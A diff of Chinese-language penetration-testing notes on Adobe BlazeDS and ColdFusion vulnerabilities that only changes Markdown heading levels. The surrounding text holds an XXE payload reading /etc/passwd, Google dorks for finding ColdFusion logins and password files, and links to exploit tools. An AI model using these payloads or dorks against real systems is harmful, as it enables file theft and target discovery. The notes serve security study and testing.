@@ -1,4 +1,4 @@
-#### [CVE-2009-3960] XXE BlazeDS<= 3.2
+### [CVE-2009-3960] XXE BlazeDS<= 3.2
 影响组件：
 HTTPChannel servlet。具体的，是
 ```
@@ -47,7 +47,7 @@ Content-type: application/x-amf
 - [Adobe (Multiple Products) - XML External Entity / XML Injection](https://www.exploit-db.com/exploits/11529)
 - [Adboe官方对BlazeDS的公告](https://www.adobe.com/support/security/bulletins/apsb10-05.html)
 
-#### [CVE-2015-3269]XXE BlazeDS< 4.7.1
+### [CVE-2015-3269]XXE BlazeDS< 4.7.1
 http://mail-archives.apache.org/mod_mbox/flex-users/201511.mbox/%3Cop.x8j4mv0bn9yd54@christofers-macbook-pro.local%3E
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -56,7 +56,7 @@ http://mail-archives.apache.org/mod_mbox/flex-users/201511.mbox/%3Cop.x8j4mv0bn9
     <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-#### [CVE-2015-5255]SSRF BlazeDS< 4.7.2
+### [CVE-2015-5255]SSRF BlazeDS< 4.7.2
 http://apache-flex-users.2333346.n4.nabble.com/CVE-2015-3269-Apache-Flex-BlazeDS-Insecure-Xml-Entity-Expansion-Vulnerability-td10976.html
 
 ```xml
@@ -65,31 +65,31 @@ http://apache-flex-users.2333346.n4.nabble.com/CVE-2015-3269-Apache-Flex-BlazeDS
 ```
 
 
-#### [CVE-2017-3066]Adobe Coldfusion BlazeDS反序列化
+### [CVE-2017-3066]Adobe Coldfusion BlazeDS反序列化
 影响范围：
 - Adobe ColdFusion 2016 Update 3 and earlier
 - Adobe ColdFusion 11 update 11 and earlier
 - ColdFusion 10 Update 22 and earlier
 
 
-#### [CVE-2017-5641] 反序列化 BlazeDS< 4.7.3
+### [CVE-2017-5641] 反序列化 BlazeDS< 4.7.3
 - [[CVE-2017-5641] - DrayTek Vigor ACS 2 Java Deserialisation RCE](https://seclists.org/fulldisclosure/2018/Apr/40)
 
 
-### 参考
+## 参考
 - [Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution](https://www.exploit-db.com/exploits/43993)
 - https://codewhitesec.blogspot.com/2018/03/exploiting-adobe-coldfusion.html
 - [Exploitation Tool for CVE-2017-3066 targeting Adobe Coldfusion 11/12](https://github.com/codewhitesec/ColdFusionPwn/tree/master/src/main/java)
 - https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2017-3066/README.zh-cn.md
 - [Adobe官方公告](https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html)
 
-## 其他参考
+# 其他参考
 
 - [ColdFusion for Pentesters](http://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf)
 - http://web.archive.org/web/20101226181618/http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf
 
 
-### Google Dorks
+## Google Dorks
 ```
 - filetype:cfm "cfapplication name" password
 - inurl:login.cfm
@@ -101,10 +101,10 @@ http://apache-flex-users.2333346.n4.nabble.com/CVE-2015-3269-Apache-Flex-BlazeDS
 ```
 
 
-### CodeFusion各个版本的界面
+## CodeFusion各个版本的界面
 
 
-## 利用工具
+# 利用工具
 - https://github.com/codewhitesec/ColdFusionPwn/tree/master/src/main/java
 - https://github.com/mbechler/marshalsec/blob/6e5f2a7974a62fcd0e5bbbf8df64774a50db2eb8/src/main/java/marshalsec/BlazeDSAMF3AM.java
 - https://github.com/mbechler/marshalsec/blob/0471b932a09c8aca21876de80c8abf65b251c9ca/src/main/java/marshalsec/BlazeDSAMFX.java
